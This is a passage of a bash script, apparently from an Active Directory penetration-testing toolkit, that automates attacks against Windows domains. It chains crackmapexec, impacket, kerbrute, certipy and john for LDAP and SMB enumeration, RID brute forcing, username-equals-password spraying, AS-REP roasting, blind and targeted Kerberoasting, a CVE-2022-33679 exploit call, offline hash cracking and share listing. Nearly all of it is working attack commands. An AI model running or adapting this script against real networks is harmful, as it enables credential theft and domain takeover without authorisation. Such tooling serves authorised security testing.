        echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
    fi
    echo -e ""
    echo -e "${BLUE}[*] Password not required Enumeration${NC}"
    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} --password-not-required --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
    echo -e ""
    echo -e "${BLUE}[*] ADCS Enumeration${NC}"
    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" -M adcs --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M get-desc-users --kdcHost "${kdc}.${dc_domain}" 2>&1 > ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
    /bin/cat ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>/dev/null | grep -i "pass\|pwd" | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_results_${dc_domain}.txt 2>&1
    if [ ! -s ${output_dir}/DomainRecon/cme_get-desc-users_pass_results_${dc_domain}.txt ]; then
        echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
    fi
    echo -e ""
    echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M MAQ --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Subnets Enumeration${NC}"
    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M subnets --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_subnets_output_${dc_domain}.txt 2>&1
    echo -e ""
    echo -e "${BLUE}[*] LDAP-signing check${NC}"
    ${crackmapexec} ${cme_verbose} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} -M ldap-signing --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
    ${crackmapexec} ${cme_verbose} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} -M ldap-checker --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Trusted-for-delegation check (cme)${NC}"
    ${crackmapexec} ${cme_verbose} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} --trusted-for-delegation --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ridbrute_attack () {
    echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --rid-brute 2>&1 > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
        count=$(wc -l ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RID Brute Force${NC}"
    else
        echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

userpass_cme_check () {
    known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
    /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
    echo -e "${BLUE}[*] Crackmapexec User=Pass Check (Noisy!)${NC}"
    if [ ! -s "${known_users_list}" ] ; then
         echo -e "${PURPLE}[-] No users found! Please run users enumeration and try again..${NC}"
    else
        echo -e "${YELLOW}[i] Finding users with Password = username using crackmapexec. This may take a while...${NC}"
        ${crackmapexec} ${cme_verbose} smb ${target} -u ${known_users_list} -p ${known_users_list} --no-bruteforce --continue-on-success 2>&1 > ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1
        /bin/cat ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1 | grep "\[+\]" | cut -d "\\" -f 2 | cut -d " " -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt"
        if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt" ] ; then
            echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
            /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt 2>/dev/null
        else
            echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
        fi
    fi
    echo -e ""
}

pre2k_check () {
    if [ ! -f "${pre2k}" ] ; then
        echo -e "${RED}[-] Please verify the installation of pre2k${NC}"
    else
        echo -e "${BLUE}[*] Pre2k authentication check (Noisy!)${NC}"
        known_computers_list="${output_dir}/DomainRecon/servers_list_sorted_${dc_domain}.txt"
        /bin/cat ${output_dir}/DomainRecon/servers_list_*_${dc_domain}.txt 2>/dev/null | cut -d "." -f 1 | sed 's/ //' | sed 's/$/\$/' | sort -uf > ${known_computers_list} 2>&1
        pre2k_outputfile="${output_dir}/DomainRecon/pre2k_outputfile_${dc_domain}.txt"
        if [ "${nullsess_bool}" == true ] ; then
            if [ ! -s "${known_computers_list}" ] ; then
                echo -e "${PURPLE}[-] No computers found! Please run computers enumeration and try again..${NC}"
            else
                ${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${known_computers_list} -outputfile ${pre2k_outputfile} | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
            fi
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
            ${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param} | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

deleg_enum_imp () {
    if [ ! -f "${impacket_findDelegation}" ] ; then
        echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
        ${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
        if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
            echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
        fi
    fi
    echo -e ""
}

certi_py_enum () {
    if [[ ! -f "${certi_py}" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certi.py${NC}"
    else
        echo -e "${BLUE}[*] certi.py Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
        else
            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

certipy_enum () {
    if [[ ! -f "${certipy}" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        echo -e "${BLUE}[*] Certipy Enumeration${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/ADCS/*_Certipy* 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] Certipy results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] certipy requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/ADCS
                if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
                ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
                ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -stdout 2>&1 | tee -a ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
                cd ${current_dir}
            fi
        fi
    fi
    echo -e ""
}

ldapdomaindump_enum () {
    if [ ! -f "${ldapdomaindump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
    else
        echo -e "${BLUE}[*] ldapdomaindump Enumeration${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDomainDump/ | grep -v 'ldd_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
            elif [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos tickets${NC}"
            else
                if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                if [ "${ldaps_bool}" == true ]; then ldaps_param="ldaps"; else ldaps_param="ldap"; fi
                ${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
            fi
        #Parsing user and computer lists
        /bin/cat ${output_dir}/DomainRecon/LDAPDomainDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldd_${dc_domain}.txt 2>&1
        /bin/cat ${output_dir}/DomainRecon/LDAPDomainDump/${dc_domain}/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${output_dir}/DomainRecon/servers_list_ldd_${dc_domain}.txt 2>&1
        fi
    fi
    echo -e ""
}

silenthound_enum () {
    if [ ! -f "${silenthound}" ]; then
        echo -e "${RED}[-] Please verify the location of silenthound${NC}"
    else
        echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/SilentHound/ | grep -v 'silenthound_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] SilentHound results found, skipping... ${NC}"
        else
            if [ "${kerb_bool}" == true ]; then
                echo -e "${PURPLE}[-] SilentHound does not support kerberos tickets${NC}"
            else
                if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] SilentHound does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/SilentHound
                if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                ${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain} 2>&1 > ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt
                cd ${current_dir}
                /bin/cp ${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt ${output_dir}/DomainRecon/servers_list_shd_${dc_domain}.txt 2>/dev/null
                head -n 20 ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt 2>/dev/null
                echo -e "............................(truncated output)"
                echo -e "${GREEN}[+] SilentHound enumeration complete.${NC}"
            fi
        fi
    fi
    echo -e ""
}

ldeep_enum () {
    if [ ! -f "${ldeep}" ]; then
        echo -e "${RED}[-] Please verify the location of ldeep${NC}"
    else
        echo -e "${BLUE}[*] ldeep Enumeration${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/ldeepDump/ | grep -v 'ldeep_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] ldeep results found, skipping... ${NC}"
        else
            if [ "${kerb_bool}" == true ]; then
                echo -e "${PURPLE}[-] ldeep does not support kerberos tickets${NC}"
            else
                ${ldeep} ldap ${argument_ldeep} -s ldap://"${target}" all ${output_dir}/DomainRecon/ldeepDump/${dc_domain} 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
            fi
        fi
    fi
    echo -e ""
}

windapsearch_enum () {
    if [ ! -f "${windapsearch}" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch${NC}"
    else
        echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets${NC}"
        else
            if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
            ${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt
            ${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
            ${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full > ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt
            ${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full > ${output_dir}/DomainRecon/windapsearch_privusers_${dc_domain}.txt
            #Parsing user and computer lists
            /bin/cat ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep -a "sAMAccountName:" | sed "s/sAMAccountName: //g" | sort -u > ${output_dir}/DomainRecon/users_list_windap_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep -a "dNSHostName:" | sed "s/dNSHostName: //g" | sort -u > ${output_dir}/DomainRecon/servers_list_windap_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt 2>/dev/null | grep -a "cn:" | sed "s/cn: //g" | sort -u > ${output_dir}/DomainRecon/groups_list_windap_${dc_domain}.txt 2>&1
            grep -iha "pass\|pwd" ${output_dir}/DomainRecon/windapsearch_*_${dc_domain}.txt 2>/dev/null | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExch"  > ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt
            if [ -s "${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing passwords found in LDAP fields...${NC}"
                /bin/cat ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt 2>/dev/null
            fi
            echo -e "${GREEN}[+] windapsearch enumeration of users, servers, groups complete.${NC}"
        fi
    fi
    echo -e ""
}

###### Kerberos attacks
kerbrute_enum () {
    echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        if [ ! -f "${kerbrute}" ] ; then
            echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
        else
            echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration. This may take a while...${NC}"
            "${kerbrute}" userenum ${users_list} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute} > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt 2>&1
            if [ -s "${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                /bin/cat ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>/dev/null | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 | tee ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>&1
            fi
        fi
    else
        echo -e "${PURPLE}[-] Kerbrute null session enumeration skipped (credentials provided)${NC}"
    fi 
    echo -e ""
}

userpass_kerbrute_check () {
    if [ ! -f "${kerbrute}" ] ; then
        echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
    else
        known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
        /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
        user_pass_wordlist="${output_dir}/Kerberos/kerbrute_userpass_wordlist_${dc_domain}.txt"
        
        echo -e "${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}"
        if [ -s "${known_users_list}" ] ; then
            echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
            /bin/rm "${user_pass_wordlist}" 2>/dev/null
            for i in $(/bin/cat ${known_users_list}); do
                echo -e "${i}:${i}" >> "${user_pass_wordlist}"
            done
            "${kerbrute}" bruteforce "${user_pass_wordlist}" -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute} > ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1 | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt"
            if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
                /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt 2>/dev/null
            else
                echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
            fi
        else
            echo -e "${PURPLE}[-] No known users found. Run user enumeraton (crackmapexec, ldapdomaindump, enum4linux or windapsearch) and try again.${NC}"
        fi
    fi
    echo -e ""
}

asrep_attack () {
    if [ ! -f "${impacket_GetNPUsers}" ]; then
        echo -e "${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}"
    else
        known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
        /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
        
        echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
            if [ -s "${known_users_list}" ] ; then
                users_scan_list=${known_users_list}
            else
                echo -e "${YELLOW}[i] No credentials for target domain provided. Using $users_list wordlist...${NC}"
                users_scan_list=${users_list}
            fi
            ${impacket_GetNPUsers} "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
        else
            ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip}
            ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
        fi
        if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
        else
            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' | tee ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
            if [ -s "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing ASREP-roastable accounts...${NC}"
            else
                echo -e "${PURPLE}[-] No ASREP-roastable accounts found${NC}"
            fi
        fi
    fi 
    echo -e ""
}

asreprc4_attack () {
    echo -e "${BLUE}[*] CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)${NC}"
    if [ ! -f "${CVE202233679}" ] ; then
        echo -e "${RED}[-] Please verify the location of CVE-2022-33679.py${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            if [ ! -f "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ]; then
                asrep_attack
            fi
            asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                python3 ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679} | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt 2>&1
                cd ${current_dir}
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${PURPLE}[-] CVE-2022-33679 skipped (credentials provided)${NC}"
        fi
    fi
    echo -e ""
}

kerberoast_attack () {
    if [ ! -f "${impacket_GetUserSPNs}" ]; then
        echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
    else
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
            known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
            /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
            echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
            asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} "${dc_domain}/" > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
                if grep -q 'error' ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt; then
                    echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                else
                    /bin/cat ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' | tee ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
                fi
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
            ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
            if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                    echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
                else
                    /bin/cat ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
            fi
        fi
    fi 
    echo -e ""
}

targetedkerberoast_attack () {
    echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
    if [ ! -f "${targetedKerberoast}" ] ; then
        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt 2>&1
        fi
    fi
    echo -e ""
}

john_crack_asrep(){
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list
            echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show | tee ${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

john_crack_kerberoast(){
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt ] && [ ! -s ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No SPN accounts found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            $john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
            echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
            $john ${output_dir}/Kerberos/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

###### Shares scan
smb_map () {
    if [ ! -f "${smbmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        echo -e "${BLUE}[*] SMB shares Scan using smbmap${NC}"
        if [ "${kerb_bool}" == true ] ; then
            echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
        else
            if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] smbmap does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
            smb_scan
            echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
            for i in $(/bin/cat ${servers_smb_list} | grep -v ":"); do
                echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
                ${smbmap} -H $i ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_${i}.txt 2>&1
            done

            grep -iaH READ ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.csv
            grep -iaH READ ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.txt

            echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
